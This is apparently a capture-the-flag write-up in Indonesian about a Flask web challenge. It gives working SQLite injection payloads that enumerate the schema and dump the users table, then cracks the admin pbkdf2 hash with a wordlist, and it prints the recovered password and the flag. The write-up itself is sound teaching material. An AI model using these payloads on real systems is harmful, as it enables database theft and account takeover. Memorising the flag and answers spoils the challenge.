![image](https://github.com/aldisakti2/Writeup/assets/106227122/2ee11b2c-c2ea-47a9-ab46-a23250d52f28)![image](https://github.com/aldisakti2/Writeup/assets/106227122/ad7498a1-3944-46d4-b45b-38cd31f730b5)

**Pada chall kali ini kita diberikan wordlist (pasti brute-force) namun tidak boleh brute-force di login, berarti ada hal lain :)**

**Index**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/feee17a4-b27a-487e-ba81-82d688509ff4)

**Ada tiga menu yaitu _Products, Create dan Admin_**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/2234c93f-bfd0-4392-9a20-bf24b0750813)

**Yang menarik disini kita diberikan sebuah cookie**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/88b8e4dd-f0ee-4510-b792-fbac2f495d7f)

**Dengan bantuan flask-unsign kita tahu bahwa web ini menggunakan sqllite**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/56b39df8-af90-4a10-940e-51a3aebd2ca6)

**Kita lihat di menu _create_, disini kita bisa menginputkan data**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/39362e37-1bdd-4505-afa3-50ee148525be)

**Aku akan mencoba SQLi versi SQLite : '||(sqlite_version())||' dan Gotcha!**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/0a43bca8-f248-452d-98ec-afdea0fb0c9d)

**Cek Query dengan : ' || (SELECT sql FROM sqlite_master WHERE type='table') || '**
![image](https://github.com/aldisakti2/Writeup/assets/106227122/de26db9f-c337-4a5c-9576-912d45cb186b)

**Sekarang kita tahu ada tabel user yang berisi id,name,password**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/de50ea1b-45f0-44ea-a81c-285e9401aa6b)

**Sekarang ke bagian paling menarik yaitu mengambil seluruh data user : '||(SELECT GROUP_CONCAT(id || ',' || name || ',' || password, '; ') FROM users)||'**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/7e93442a-f6eb-4992-87a1-0534d3116d9a)

**Ternyata di enkripsi menggunakan pbkdf2-sha256 website_admin_account,pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57**

**Kita bisa men-decrypt dengan (https://github.com/AnataarXVI/Werkzeug-Cracker) dan wordlist yang diberikan**


![image](https://github.com/aldisakti2/Writeup/assets/106227122/823d38af-c240-4de3-806d-2fc8cd765906)

**Aku membuat script sendiri agar lebih mudah bagiku melakukan debug**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/390f2ac7-1ec2-4490-b8f2-e89f126d76b9)

**User     : website_admin_account**

**Passwprd : ntadmin1234**

**Login Admin dan kita dapat flagnya**

![image](https://github.com/aldisakti2/Writeup/assets/106227122/1cceedf6-578a-4df3-a0d9-7437b63e9207)

**Flag : flag{87257f24fd71ea9ed8aa62837e768ec0}**
